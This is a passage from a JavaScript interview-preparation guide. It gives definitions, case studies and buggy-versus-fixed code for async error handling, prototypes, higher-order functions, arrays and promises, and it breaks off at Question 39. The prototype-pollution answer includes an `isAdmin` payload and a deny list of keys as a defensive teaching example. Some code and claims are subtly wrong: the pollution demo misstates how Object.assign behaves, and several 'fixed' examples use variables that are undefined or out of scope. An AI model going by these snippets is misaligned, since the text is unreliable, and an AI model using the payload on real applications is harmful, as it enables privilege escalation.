      throw error;  // Re-throw to let caller know it failed
    });
}

// FIX 2 - async/await with try/catch:
async function processPayment(amount) {
  let chargeId;
  try {
    chargeId = await chargeCard(amount);
    const transactionId = await recordTransaction(chargeId);
    await updateUserBalance(transactionId);
    return { success: true, transactionId };
  } catch (error) {
    console.error('Payment failed:', error);
    // Rollback: refund if charged
    if (chargeId) {
      await refundCharge(chargeId);
    }
    throw error;
  }
}

// FIX 3 - handle errors in callbacks:
function processPayment(amount, callback) {
  chargeCard(amount, (error, chargeId) => {
    if (error) {
      return callback(error);  // Always check for errors!
    }
    
    recordTransaction(chargeId, (error, transactionId) => {
      if (error) {
        refundCharge(chargeId);  // Rollback
        return callback(error);
      }
      
      updateUserBalance(transactionId, (error) => {
        if (error) {
          return callback(error);
        }
        callback(null, { success: true, transactionId });
      });
    });
  });
}
```

---

## 3. Objects & Prototypes

### Question 21: How does prototypal inheritance work in JavaScript?

#### Definition
Prototypal inheritance is like a family tree where objects can inherit properties and methods from their "ancestors" (prototypes). When you ask an object for a property it doesn't have, JavaScript looks up the chain to its prototype, then the prototype's prototype, and so on, until it finds it or reaches the end. It's like asking your parents for something - if they don't have it, they might ask their parents, and so on up the family tree.

#### Real-World Scenario / Case Study
A team was building a game with different character types. They created base character objects and tried to create new characters by copying them. However, when they modified methods on child characters, it affected the parent prototype, breaking all other characters. They didn't understand that objects share the same prototype reference. The fix required proper prototype chain setup or using classes.

#### Example Code
```js
// Prototypal inheritance:
const animal = {
  name: 'Animal',
  speak() {
    return `${this.name} makes a sound`;
  }
};

const dog = Object.create(animal);  // dog inherits from animal
dog.name = 'Dog';
dog.breed = 'Labrador';

console.log(dog.speak());  // "Dog makes a sound" (inherited method)
console.log(dog.breed);    // "Labrador" (own property)

// Prototype chain lookup:
console.log(dog.toString);  // Found on Object.prototype (further up chain)

// BUGGY CODE - shared prototype mutation:
function createCharacter(name) {
  const character = Object.create(baseCharacter);
  character.name = name;
  return character;
}

const baseCharacter = {
  inventory: [],  // Shared array!
  addItem(item) {
    this.inventory.push(item);
  }
};

const hero = createCharacter('Hero');
const villain = createCharacter('Villain');

hero.addItem('Sword');
console.log(villain.inventory);  // ['Sword'] - BUG! Shared array

// FIX - initialize in constructor:
function createCharacter(name) {
  const character = Object.create(baseCharacter);
  character.name = name;
  character.inventory = [];  // Each gets its own array
  return character;
}
```

---

### Question 22: What is the difference between `Object.create()`, constructor functions, and classes?

#### Definition
These are three ways to create objects that inherit from other objects. `Object.create()` is like manually setting up the family tree. Constructor functions are like blueprints you call with `new` to create instances. Classes are a modern, cleaner syntax that does the same thing as constructor functions but looks more like other programming languages. Under the hood, classes are just constructor functions with syntactic sugar.

#### Real-World Scenario / Case Study
A codebase mixed all three approaches inconsistently, making it hard for developers to understand the inheritance structure. Some parts used `Object.create()`, others used constructor functions, and newer code used classes. When debugging inheritance issues, developers had to understand all three patterns. The team standardized on classes for consistency and better tooling support.

#### Example Code
```js
// Method 1: Object.create()
const animal = { name: 'Animal', speak() { return 'Sound'; } };
const dog = Object.create(animal);
dog.name = 'Dog';

// Method 2: Constructor function
function Animal(name) {
  this.name = name;
}
Animal.prototype.speak = function() {
  return 'Sound';
};

function Dog(name, breed) {
  Animal.call(this, name);  // Call parent constructor
  this.breed = breed;
}
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog;

const dog1 = new Dog('Rex', 'Labrador');

// Method 3: Classes (syntactic sugar for constructor functions)
class Animal {
  constructor(name) {
    this.name = name;
  }
  speak() {
    return 'Sound';
  }
}

class Dog extends Animal {
  constructor(name, breed) {
    super(name);  // Call parent constructor
    this.breed = breed;
  }
}

const dog2 = new Dog('Rex', 'Labrador');

// All three create similar inheritance, but classes are cleaner
```

---

### Question 23: How does `this` binding work with arrow functions vs regular functions?

#### Definition
Regular functions have their own `this` that changes based on how they're called - it's like a chameleon that adapts to its environment. Arrow functions don't have their own `this` - they inherit `this` from where they were written (lexical `this`). It's like a regular function is a person who changes their accent based on where they are, while an arrow function keeps the accent from where they grew up.

#### Real-World Scenario / Case Study
A React component had event handlers that needed to access component state, but `this` was `undefined` because the method was passed as a callback. The developer tried using arrow functions in the class, but then couldn't override methods in subclasses properly. The team had to understand when to use arrow functions (for callbacks) vs regular methods (for overridable methods).

#### Example Code
```js
const obj = {
  name: 'MyObject',
  regularFunction: function() {
    console.log(this.name);  // this = obj
  },
  arrowFunction: () => {
    console.log(this.name);  // this = global/window (lexical)
  },
  nested: function() {
    const innerRegular = function() {
      console.log(this.name);  // this = global (lost context!)
    };
    
    const innerArrow = () => {
      console.log(this.name);  // this = obj (inherited)
    };
    
    innerRegular();  // undefined
    innerArrow();    // "MyObject"
  }
};

obj.regularFunction();  // "MyObject"
obj.arrowFunction();    // undefined (or window.name)
obj.nested();

// REAL BUG SCENARIO:
class Button extends React.Component {
  state = { clicked: false };
  
  // Arrow function - this is bound to instance
  handleClick = () => {
    this.setState({ clicked: true });  // Works!
  }
  
  // Regular method - this can be lost
  handleHover() {
    this.setState({ hovered: true });  // Error if not bound!
  }
  
  render() {
    return (
      <button 
        onClick={this.handleClick}      // Works - arrow function
        onMouseEnter={this.handleHover} // Error - need to bind
      />
    );
  }
}
```

---

### Question 24: What is the prototype chain and how does property lookup work?

#### Definition
The prototype chain is like a ladder - when JavaScript looks for a property on an object, it first checks the object itself. If not found, it climbs up one rung to the object's prototype. If still not found, it climbs to the prototype's prototype, and so on, until it reaches `Object.prototype` (the top of the ladder) or finds the property. If it reaches the top without finding it, it returns `undefined`.

#### Real-World Scenario / Case Study
A library was adding methods to `Array.prototype` to extend functionality. However, when code used `for...in` loops on arrays, it iterated over these custom methods as well, causing bugs. The code expected only array elements but got methods too. The fix required using `Object.defineProperty` with `enumerable: false` or using `hasOwnProperty` checks.

#### Example Code
```js
// Prototype chain:
const arr = [1, 2, 3];

// Property lookup goes up the chain:
console.log(arr.length);        // Found on Array instance
console.log(arr.toString());    // Found on Array.prototype
console.log(arr.valueOf());     // Found on Object.prototype
console.log(arr.nonExistent);   // undefined (not found anywhere)

// Chain: arr -> Array.prototype -> Object.prototype -> null

// BUGGY CODE - enumerable prototype properties:
Array.prototype.last = function() {
  return this[this.length - 1];
};

const numbers = [1, 2, 3];

// for...in iterates over enumerable properties including prototype!
for (let prop in numbers) {
  console.log(prop);  // "0", "1", "2", "last" - BUG!
}

// FIX 1 - check hasOwnProperty:
for (let prop in numbers) {
  if (numbers.hasOwnProperty(prop)) {
    console.log(prop);  // Only "0", "1", "2"
  }
}

// FIX 2 - use non-enumerable property:
Object.defineProperty(Array.prototype, 'last', {
  value: function() {
    return this[this.length - 1];
  },
  enumerable: false  // Won't show in for...in
});

// FIX 3 - use for...of (only iterates values):
for (let value of numbers) {
  console.log(value);  // 1, 2, 3 (no prototype methods)
}
```

---

### Question 25: How do you prevent prototype pollution attacks?

#### Definition
Prototype pollution is like someone sneaking into a family tree and changing the ancestor's DNA, which then affects all descendants. Attackers can modify `Object.prototype` or other prototypes, and since all objects inherit from these, the changes affect your entire application. It's a security vulnerability where malicious code can add or modify properties on prototypes, potentially breaking your app or enabling further attacks.

#### Real-World Scenario / Case Study
A web application accepted user input that was merged into objects using a vulnerable `Object.assign` or spread operator. An attacker sent `{"__proto__": {"isAdmin": true}}` in a request. The code merged this into a user object, which polluted `Object.prototype`. Suddenly, all objects in the application had `isAdmin: true`, granting the attacker admin access. The fix required sanitizing input and using `Object.create(null)` for safe objects.

#### Example Code
```js
// VULNERABLE CODE - prototype pollution:
function mergeUserData(userInput, defaultData) {
  return Object.assign({}, defaultData, userInput);
  // Or: return { ...defaultData, ...userInput };
}

// Attacker sends:
const maliciousInput = {
  __proto__: {
    isAdmin: true
  }
};

const user = mergeUserData(maliciousInput, { name: 'User' });
// Now Object.prototype.isAdmin = true!
// All objects now have isAdmin: true

// Check if user is admin (vulnerable):
if (user.isAdmin) {  // true for ALL users now!
  grantAdminAccess();
}

// FIX 1 - use Object.create(null) for safe objects:
function mergeUserData(userInput, defaultData) {
  const safe = Object.create(null);  // No prototype chain
  return Object.assign(safe, defaultData, userInput);
}

// FIX 2 - validate and sanitize input:
function mergeUserData(userInput, defaultData) {
  // Reject dangerous keys:
  const dangerousKeys = ['__proto__', 'constructor', 'prototype'];
  for (let key in userInput) {
    if (dangerousKeys.includes(key)) {
      throw new Error('Invalid key');
    }
  }
  return Object.assign({}, defaultData, userInput);
}

// FIX 3 - use Map instead of objects:
const userData = new Map();
userData.set('name', 'User');
// No prototype chain to pollute!
```

---

## 4. Functions & Higher-Order Functions

### Question 26: What are higher-order functions and why are they useful?

#### Definition
Higher-order functions are functions that either take other functions as arguments or return functions. Think of them as function factories or function operators. Instead of writing the same code pattern repeatedly, you pass the different part (a function) to a higher-order function that handles the common pattern. It's like having a cookie cutter (higher-order function) and different cookie shapes (functions you pass in).

#### Real-World Scenario / Case Study
A data processing pipeline had repetitive code for handling errors, logging, and retries for each API call. The code was duplicated 50+ times across the codebase. When the team needed to change the retry logic, they had to update 50 places. By creating higher-order functions for error handling and retries, they reduced duplication to a single function and made the codebase more maintainable.

#### Example Code
```js
// Higher-order function - takes a function as argument:
function withLogging(fn) {
  return function(...args) {
    console.log('Calling function with:', args);
    const result = fn(...args);
    console.log('Result:', result);
    return result;
  };
}

const add = (a, b) => a + b;
const loggedAdd = withLogging(add);
loggedAdd(2, 3);  // Logs the call and result

// Higher-order function - returns a function:
function createMultiplier(multiplier) {
  return function(number) {
    return number * multiplier;
  };
}

const double = createMultiplier(2);
const triple = createMultiplier(3);
console.log(double(5));  // 10
console.log(triple(5));  // 15

// REAL USE CASE - retry logic:
function withRetry(fn, maxRetries = 3) {
  return async function(...args) {
    for (let i = 0; i < maxRetries; i++) {
      try {
        return await fn(...args);
      } catch (error) {
        if (i === maxRetries - 1) throw error;
        await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
      }
    }
  };
}

const fetchWithRetry = withRetry(fetch);
// Now all fetch calls automatically retry on failure
```

---

### Question 27: What is currying and when would you use it?

#### Definition
Currying is like breaking down a function that takes multiple arguments into a series of functions that each take one argument. Instead of `add(1, 2, 3)`, you'd have `add(1)(2)(3)`. Each function call returns a new function that's waiting for the next argument. It's like ordering food - you don't give the restaurant all your preferences at once, you specify them one at a time as you go through the menu.

#### Real-World Scenario / Case Study
A configuration system needed to create API clients with different base URLs, timeouts, and authentication. Instead of creating a function with many parameters or multiple factory functions, the team used currying to create a flexible API: `createClient(baseUrl)(timeout)(auth)`. This allowed partial application - creating a client with a base URL, then later adding timeout and auth as they became available.

#### Example Code
```js
// Regular function:
function add(a, b, c) {
  return a + b + c;
}
add(1, 2, 3);  // 6

// Curried version:
function curriedAdd(a) {
  return function(b) {
    return function(c) {
      return a + b + c;
    };
  };
}
curriedAdd(1)(2)(3);  // 6

// Partial application:
const addOne = curriedAdd(1);
const addOneAndTwo = addOne(2);
addOneAndTwo(3);  // 6

// REAL USE CASE - API client:
function createApiClient(baseUrl) {
  return function(timeout) {
    return function(authToken) {
      return {
        get: (endpoint) => fetch(`${baseUrl}${endpoint}`, {
          headers: { Authorization: `Bearer ${authToken}` },
          signal: AbortSignal.timeout(timeout)
        })
      };
    };
  };
}

// Usage:
const client = createApiClient('https://api.example.com')(5000)('token123');
// Or partial:
const apiClient = createApiClient('https://api.example.com');
const authenticatedClient = apiClient(5000)('token123');
```

---

### Question 28: What is function composition and how does it improve code?

#### Definition
Function composition is like a factory assembly line - you take the output of one function and feed it directly into the next function. Instead of storing intermediate results in variables, you chain functions together: `compose(f, g, h)(x)` means "apply h to x, then g to the result, then f to that result." It's like a recipe where each step uses the output of the previous step.

#### Real-World Scenario / Case Study
A data transformation pipeline had multiple steps: filter invalid data, transform formats, sort, and paginate. The code had many intermediate variables storing results at each step, making it hard to follow the data flow. By using function composition, the team created a clear pipeline: `paginate(sort(transform(filter(data))))`, making the transformation steps explicit and easier to reason about.

#### Example Code
```js
// Without composition - intermediate variables:
function processUsers(users) {
  const validUsers = users.filter(u => u.active);
  const withFullName = validUsers.map(u => ({
    ...u,
    fullName: `${u.firstName} ${u.lastName}`
  }));
  const sorted = withFullName.sort((a, b) => a.fullName.localeCompare(b.fullName));
  const limited = sorted.slice(0, 10);
  return limited;
}

// With composition helper:
function compose(...fns) {
  return function(value) {
    return fns.reduceRight((acc, fn) => fn(acc), value);
  };
}

const processUsers = compose(
  users => users.slice(0, 10),
  users => users.sort((a, b) => a.fullName.localeCompare(b.fullName)),
  users => users.map(u => ({
    ...u,
    fullName: `${u.firstName} ${u.lastName}`
  })),
  users => users.filter(u => u.active)
);

// Or with pipe (left to right):
function pipe(...fns) {
  return function(value) {
    return fns.reduce((acc, fn) => fn(acc), value);
  };
}

const processUsers = pipe(
  users => users.filter(u => u.active),
  users => users.map(u => ({
    ...u,
    fullName: `${u.firstName} ${u.lastName}`
  })),
  users => users.sort((a, b) => a.fullName.localeCompare(b.fullName)),
  users => users.slice(0, 10)
);
```

---

### Question 29: What are pure functions and why do they matter?

#### Definition
Pure functions are like math functions - give them the same input, you always get the same output, and they don't change anything outside themselves. They're predictable and have no "side effects" - they don't modify global variables, make API calls, or change the DOM. It's like a vending machine that always gives you the same snack for the same button press, and pressing the button doesn't affect anything else.

#### Real-World Scenario / Case Study
A React application had unpredictable behavior - the same component with the same props would render differently. The issue was that components were calling impure functions that depended on global state and current time. During testing and in production, these functions returned different values, causing test failures and UI inconsistencies. Refactoring to pure functions made the code predictable and testable.

#### Example Code
```js
// IMPURE - depends on external state:
let counter = 0;
function impureIncrement() {
  return ++counter;  // Modifies external variable
}
impureIncrement();  // 1
impureIncrement();  // 2 (different result for "same" call)

// IMPURE - has side effects:
function impureLog(message) {
  console.log(message);  // Side effect: writes to console
  return message;
}

// IMPURE - depends on non-deterministic value:
function impureGetTimestamp() {
  return Date.now();  // Different result each time
}

// PURE - same input, same output, no side effects:
function pureAdd(a, b) {
  return a + b;  // Always returns same result for same inputs
}

function pureMultiply(array, factor) {
  return array.map(x => x * factor);  // Doesn't modify original
}

// BUGGY CODE - impure function in React:
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    // IMPURE - depends on current time
    const user = fetchUser(userId);
    user.lastSeen = new Date().toISOString();  // Different each render!
    setUser(user);
  }, [userId]);
  
  return <div>{user?.name} - Last seen: {user?.lastSeen}</div>;
}

// FIX - pure transformation:
function addLastSeen(user) {
  return {
    ...user,
    lastSeen: new Date().toISOString()
  };
}

function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    fetchUser(userId)
      .then(addLastSeen)  // Pure function
      .then(setUser);
  }, [userId]);
  
  return <div>{user?.name} - Last seen: {user?.lastSeen}</div>;
}
```

---

### Question 30: What is memoization and when should you use it?

#### Definition
Memoization is like writing down the answer to a math problem so you don't have to solve it again. If someone asks you "what's 15 × 23?" and you've calculated it before, you just look up your notes instead of calculating again. In programming, you cache the results of expensive function calls - if the function is called again with the same arguments, you return the cached result instead of recalculating.

#### Real-World Scenario / Case Study
A dashboard was recalculating complex analytics on every render, even when the underlying data hadn't changed. The calculations took 2-3 seconds each time, making the UI feel sluggish. Users would switch tabs and come back, triggering expensive recalculations. By memoizing the calculation function, the dashboard only recalculated when inputs actually changed, reducing render time from 3 seconds to 50ms for cached results.

#### Example Code
```js
// Expensive calculation without memoization:
function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}
// fibonacci(40) takes seconds - recalculates same values repeatedly

// With memoization:
function memoize(fn) {
  const cache = new Map();
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) {
      return cache.get(key);
    }
    const result = fn(...args);
    cache.set(key, result);
    return result;
  };
}

const memoizedFibonacci = memoize(fibonacci);
memoizedFibonacci(40);  // First call: slow
memoizedFibonacci(40);  // Second call: instant (from cache)

// REAL USE CASE - expensive API data transformation:
function transformUserData(users) {
  // Expensive operation - filtering, sorting, aggregating
  return users
    .filter(u => u.active)
    .map(u => expensiveTransformation(u))
    .sort(complexSort);
}

const memoizedTransform = memoize(transformUserData);

// React component:
function UserDashboard({ users }) {
  // Only recalculates if users array reference changes
  const transformed = memoizedTransform(users);
  return <div>{/* render */}</div>;
}

// Better: use useMemo hook:
function UserDashboard({ users }) {
  const transformed = useMemo(
    () => transformUserData(users),
    [users]  // Only recalculate if users changes
  );
  return <div>{/* render */}</div>;
}
```

---

## 7. Arrays & Array Methods

### Question 31: What is the difference between `map`, `filter`, and `reduce` and when to use each?

#### Definition
Think of arrays like a list of items. `map` transforms each item into something else - like converting a list of names to a list of name lengths. `filter` picks out items that meet a condition - like finding all names longer than 5 characters. `reduce` combines all items into a single value - like adding up all the numbers in a list to get a total. Each serves a different purpose: transform, select, or combine.

#### Real-World Scenario / Case Study
A shopping cart was calculating totals incorrectly because developers mixed up `map` and `reduce`. They used `map` to sum prices, which returned an array instead of a number. The UI displayed `[45, 67, 89]` instead of `201`. Another bug used `filter` when they needed `map`, causing items to disappear from the cart. Understanding when to use each method fixed these issues.

#### Example Code
```js
const prices = [10, 20, 30, 40];

// map - transforms each item (array length stays same):
const doubled = prices.map(p => p * 2);  // [20, 40, 60, 80]

// filter - selects items (array length may change):
const expensive = prices.filter(p => p > 25);  // [30, 40]

// reduce - combines to single value:
const total = prices.reduce((sum, p) => sum + p, 0);  // 100

// BUGGY CODE - wrong method:
function calculateTotal(items) {
  return items.map(item => item.price);  // Returns array, not total!
  // Should use reduce
}

// FIX:
function calculateTotal(items) {
  return items.reduce((sum, item) => sum + item.price, 0);
}

// Another bug - using filter to transform:
function getItemNames(items) {
  return items.filter(item => item.name);  // Wrong! Returns items, not names
}

// FIX:
function getItemNames(items) {
  return items.map(item => item.name);
}
```

---

### Question 32: Why does `array.sort()` mutate the original array and how to avoid it?

#### Definition
Most array methods like `map` and `filter` create new arrays, but `sort()` is different - it rearranges the original array in place. It's like reorganizing books on a shelf - the books move, but it's still the same shelf. If you want to keep the original order, you need to make a copy first, like taking a photo of the shelf before reorganizing.

#### Real-World Scenario / Case Study
A React application was displaying user lists in random orders. The developer sorted the list before displaying it, not realizing `sort()` mutated the original array stored in state. When the component re-rendered, it sorted an already-sorted array differently, causing the order to change on every render. Users complained about the list jumping around. The fix required creating a copy before sorting.

#### Example Code
```js
const numbers = [3, 1, 4, 1, 5];
const sorted = numbers.sort();
console.log(numbers);  // [1, 1, 3, 4, 5] - original mutated!
console.log(sorted);    // [1, 1, 3, 4, 5] - same reference

// BUGGY CODE - mutates state:
function UserList({ users }) {
  const sorted = users.sort((a, b) => a.name.localeCompare(b.name));
  // users array is now mutated! Next render will have issues
  return <div>{sorted.map(u => <div>{u.name}</div>)}</div>;
}

// FIX 1 - create copy first:
function UserList({ users }) {
  const sorted = [...users].sort((a, b) => a.name.localeCompare(b.name));
  return <div>{sorted.map(u => <div>{u.name}</div>)}</div>;
}

// FIX 2 - use toSorted() (ES2023):
function UserList({ users }) {
  const sorted = users.toSorted((a, b) => a.name.localeCompare(b.name));
  return <div>{sorted.map(u => <div>{u.name}</div>)}</div>;
}
```

---

### Question 33: How do you find unique values in an array efficiently?

#### Definition
Finding unique values means removing duplicates - like having a guest list with some names appearing twice and wanting only one entry per person. There are several ways: using `Set` (like a special list that automatically rejects duplicates), using `filter` with `indexOf` (checking if it's the first occurrence), or using `reduce` to build a unique list. `Set` is usually the fastest and cleanest.

#### Real-World Scenario / Case Study
An analytics dashboard was showing duplicate user IDs in reports, making metrics inaccurate. The code used a nested loop to find unique values, which was O(n²) and slow for large datasets (100k+ records). The dashboard took 30+ seconds to load. Switching to `Set` reduced the time to under 1 second and fixed the duplicate issue.

#### Example Code
```js
const numbers = [1, 2, 2, 3, 3, 3, 4, 5, 5];

// Method 1: Set (fastest, ES6+):
const unique1 = [...new Set(numbers)];  // [1, 2, 3, 4, 5]

// Method 2: filter with indexOf:
const unique2 = numbers.filter((item, index) => numbers.indexOf(item) === index);

// Method 3: reduce:
const unique3 = numbers.reduce((acc, item) => {
  if (!acc.includes(item)) acc.push(item);
  return acc;
}, []);

// Method 4: for...of with Set:
const seen = new Set();
const unique4 = [];
for (const item of numbers) {
  if (!seen.has(item)) {
    seen.add(item);
    unique4.push(item);
  }
}

// BUGGY CODE - O(n²) nested loop:
function getUniqueUsers(users) {
  const unique = [];
  for (let i = 0; i < users.length; i++) {
    let isDuplicate = false;
    for (let j = 0; j < unique.length; j++) {
      if (users[i].id === unique[j].id) {
        isDuplicate = true;
        break;
      }
    }
    if (!isDuplicate) unique.push(users[i]);
  }
  return unique;  // Very slow for large arrays!
}

// FIX - use Set:
function getUniqueUsers(users) {
  const seen = new Set();
  return users.filter(user => {
    if (seen.has(user.id)) return false;
    seen.add(user.id);
    return true;
  });
}

// Or with Map for objects:
function getUniqueUsers(users) {
  const map = new Map();
  users.forEach(user => {
    if (!map.has(user.id)) {
      map.set(user.id, user);
    }
  });
  return Array.from(map.values());
}
```

---

### Question 34: What is the difference between `forEach`, `for...of`, and `for` loops?

#### Definition
All three iterate over arrays, but with different trade-offs. `forEach` is functional and clean but can't break early or return values. `for...of` is modern, works with any iterable, and supports `break`/`continue`. Traditional `for` loops are the most flexible and performant but more verbose. It's like choosing between a bicycle (forEach - simple but limited), a car (for...of - good balance), or a race car (for - fastest but more complex).

#### Real-World Scenario / Case Study
A search function needed to stop iterating once it found a match, but the developer used `forEach`, which doesn't support `break`. The code continued searching through the entire array even after finding the result, wasting CPU cycles. For large arrays (10k+ items), this added 100-200ms of unnecessary work. Switching to `for...of` with `break` reduced search time from 200ms to 5ms.

#### Example Code
```js
const items = [1, 2, 3, 4, 5];

// forEach - functional, can't break:
items.forEach(item => {
  console.log(item);
  // Can't use break or return to stop early
});

// for...of - modern, can break:
for (const item of items) {
  console.log(item);
  if (item === 3) break;  // Stops iteration
}

// Traditional for - most control:
for (let i = 0; i < items.length; i++) {
  console.log(items[i]);
  if (items[i] === 3) break;
}

// BUGGY CODE - can't break from forEach:
function findUser(users, targetId) {
  let found = null;
  users.forEach(user => {
    if (user.id === targetId) {
      found = user;
      // Can't break! Continues through entire array
    }
  });
  return found;  // Inefficient
}

// FIX 1 - use for...of:
function findUser(users, targetId) {
  for (const user of users) {
    if (user.id === targetId) {
      return user;  // Stops immediately
    }
  }
  return null;
}

// FIX 2 - use find() method:
function findUser(users, targetId) {
  return users.find(user => user.id === targetId);
}
```

---

### Question 35: How do you flatten a nested array and what are the performance implications?

#### Definition
Flattening means taking a nested array like `[[1, 2], [3, 4]]` and making it flat: `[1, 2, 3, 4]`. It's like unpacking boxes within boxes to get all items in one pile. You can do it with `flat()`, `flatMap()`, or recursively. The depth of nesting and array size affects performance - deeply nested or very large arrays can be slow to flatten.

#### Real-World Scenario / Case Study
An API returned nested category structures, and the code needed all categories in a flat list. The developer used a recursive function that created many intermediate arrays, causing memory issues with deeply nested data (10+ levels). The browser ran out of memory. Using `flat(Infinity)` or an iterative approach fixed the memory issue and improved performance.

#### Example Code
```js
const nested = [1, [2, 3], [4, [5, 6]]];

// Method 1: flat() with depth:
const flat1 = nested.flat(1);      // [1, 2, 3, 4, [5, 6]]
const flat2 = nested.flat(2);      // [1, 2, 3, 4, 5, 6]
const flat3 = nested.flat(Infinity);  // Flattens all levels

// Method 2: flatMap() - map then flatten:
const numbers = [1, 2, 3];
const doubled = numbers.flatMap(n => [n, n * 2]);  // [1, 2, 2, 4, 3, 6]

// Method 3: reduce (manual):
function flatten(arr) {
  return arr.reduce((acc, val) => {
    return acc.concat(Array.isArray(val) ? flatten(val) : val);
  }, []);
}

// BUGGY CODE - recursive, memory intensive:
function flattenDeep(arr) {
  let result = [];
  for (let item of arr) {
    if (Array.isArray(item)) {
      result = result.concat(flattenDeep(item));  // Creates many arrays
    } else {
      result.push(item);
    }
  }
  return result;  // Memory issues with deep nesting
}

// FIX 1 - use flat():
function flattenDeep(arr) {
  return arr.flat(Infinity);  // Built-in, optimized
}

// FIX 2 - iterative (better memory):
function flattenDeep(arr) {
  const stack = [...arr];
  const result = [];
  while (stack.length) {
    const next = stack.pop();
    if (Array.isArray(next)) {
      stack.push(...next);
    } else {
      result.push(next);
    }
  }
  return result.reverse();
}
```

---

## Promises & Async/Await

### Question 36: What is the difference between `Promise.all`, `Promise.allSettled`, and `Promise.race`?

#### Definition
These are different ways to handle multiple promises. `Promise.all` is like a group project where everyone must finish - if one person fails, the whole project fails. `Promise.allSettled` is more forgiving - it waits for everyone to finish (success or failure) and tells you all results. `Promise.race` is like a race - whoever finishes first wins, and you don't wait for the others.

#### Real-World Scenario / Case Study
A dashboard was loading data from 5 APIs. The code used `Promise.all`, so if one API was slow or failed, the entire dashboard waited or failed. Users saw a loading spinner for 30+ seconds. Switching to `Promise.allSettled` allowed the dashboard to show data from successful APIs immediately while handling failures gracefully. For timeouts, `Promise.race` was used to cancel slow requests.

#### Example Code
```js
const p1 = Promise.resolve(1);
const p2 = Promise.resolve(2);
const p3 = Promise.reject('Error');

// Promise.all - fails fast if any reject:
Promise.all([p1, p2, p3])
  .then(results => console.log(results))
  .catch(error => console.log(error));  // "Error" - entire thing fails

// Promise.allSettled - waits for all, shows all results:
Promise.allSettled([p1, p2, p3])
  .then(results => {
    // [
    //   { status: 'fulfilled', value: 1 },
    //   { status: 'fulfilled', value: 2 },
    //   { status: 'rejected', reason: 'Error' }
    // ]
  });

// Promise.race - first to finish wins:
Promise.race([p1, p2, p3])
  .then(result => console.log(result))  // 1 (first resolved)
  .catch(error => console.log(error));

// REAL USE CASE - API calls:
async function loadDashboard() {
  // BUGGY - all or nothing:
  try {
    const [users, posts, comments] = await Promise.all([
      fetchUsers(),
      fetchPosts(),
      fetchComments()
    ]);
    // If any fails, nothing loads
  } catch (error) {
    // Entire dashboard fails
  }
}

// FIX - graceful degradation:
async function loadDashboard() {
  const [usersResult, postsResult, commentsResult] = await Promise.allSettled([
    fetchUsers(),
    fetchPosts(),
    fetchComments()
  ]);
  
  return {
    users: usersResult.status === 'fulfilled' ? usersResult.value : [],
    posts: postsResult.status === 'fulfilled' ? postsResult.value : [],
    comments: commentsResult.status === 'fulfilled' ? commentsResult.value : []
  };
  // Dashboard shows what it can, handles failures gracefully
}

// Timeout pattern with race:
function fetchWithTimeout(url, timeout = 5000) {
  return Promise.race([
    fetch(url),
    new Promise((_, reject) => 
      setTimeout(() => reject(new Error('Timeout')), timeout)
    )
  ]);
}
```

---

### Question 37: How do you handle errors in Promise chains vs async/await?

#### Definition
Both handle errors, but differently. In Promise chains, errors "bubble up" through `.catch()` blocks. If you don't catch an error, it becomes an unhandled rejection. With async/await, you use try/catch like synchronous code, which feels more natural. However, forgetting to await a promise in async/await means errors won't be caught by your try/catch.

#### Real-World Scenario / Case Study
A payment flow mixed Promise chains and async/await inconsistently. Some errors were caught, others weren't. The developer forgot to `await` a promise in an async function, so the error wasn't caught by the try/catch block. Payments failed silently, and the error only appeared in console logs. Standardizing on async/await with proper error handling fixed the issue.

#### Example Code
```js
// Promise chain error handling:
function processPayment(amount) {
  return chargeCard(amount)
    .then(chargeId => recordTransaction(chargeId))
    .then(transactionId => updateBalance(transactionId))
    .catch(error => {
      // Catches errors from any step
      console.error('Payment failed:', error);
      throw error;
    });
}

// async/await error handling:
async function processPayment(amount) {
  try {
    const chargeId = await chargeCard(amount);
    const transactionId = await recordTransaction(chargeId);
    await updateBalance(transactionId);
  } catch (error) {
    // Catches errors from any await
    console.error('Payment failed:', error);
    throw error;
  }
}

// BUGGY CODE - missing await:
async function processPayment(amount) {
  try {
    const chargeId = await chargeCard(amount);
    recordTransaction(chargeId);  // Missing await! Error not caught
    // If this fails, error is unhandled
  } catch (error) {
    // Won't catch recordTransaction errors
    console.error('Payment failed:', error);
  }
}

// FIX:
async function processPayment(amount) {
  try {
    const chargeId = await chargeCard(amount);
    await recordTransaction(chargeId);  // Now errors are caught
    await updateBalance(transactionId);
  } catch (error) {
    console.error('Payment failed:', error);
    throw error;
  }
}

// Handling multiple promises:
async function processPayments(payments) {
  const results = await Promise.allSettled(
    payments.map(p => processPayment(p.amount))
  );
  
  const failures = results
    .filter(r => r.status === 'rejected')
    .map(r => r.reason);
  
  if (failures.length > 0) {
    console.error('Some payments failed:', failures);
  }
}
```

---

### Question 38: What is a Promise and how does it differ from callbacks?

#### Definition
A Promise is like a receipt for work that will be done later. Instead of giving someone a callback function to call when done (like leaving your phone number), you get a Promise object that will eventually have a result. You can chain operations on promises and handle errors more cleanly than with callbacks. It's like ordering food and getting a ticket - you can do other things while waiting, and the ticket tells you when it's ready.

#### Real-World Scenario / Case Study
A codebase had callback-based code with 5+ levels of nesting. When errors occurred, it was unclear which callback level failed. The code was hard to test and debug. Refactoring to Promises made the code linear and easier to follow. Error handling became consistent, and the team could add retry logic and timeouts more easily.

#### Example Code
```js
// Callback style (nested, hard to read):
function getUserData(userId, callback) {
  getUser(userId, (error, user) => {
    if (error) return callback(error);
    getProfile(user.id, (error, profile) => {
      if (error) return callback(error);
      getSettings(profile.id, (error, settings) => {
        if (error) return callback(error);
        callback(null, { user, profile, settings });
      });
    });
  });
}

// Promise style (flat, readable):
function getUserData(userId) {
  return getUser(userId)
    .then(user => getProfile(user.id))
    .then(profile => getSettings(profile.id))
    .then(settings => ({ user, profile, settings }))
    .catch(error => {
      // Single error handler for entire chain
      console.error('Failed to get user data:', error);
      throw error;
    });
}

// async/await (even cleaner):
async function getUserData(userId) {
  try {
    const user = await getUser(userId);
    const profile = await getProfile(user.id);
    const settings = await getSettings(profile.id);
    return { user, profile, settings };
  } catch (error) {
    console.error('Failed to get user data:', error);
    throw error;
  }
}
```

---

### Question 39: How do you cancel or abort a Promise?

#### Definition
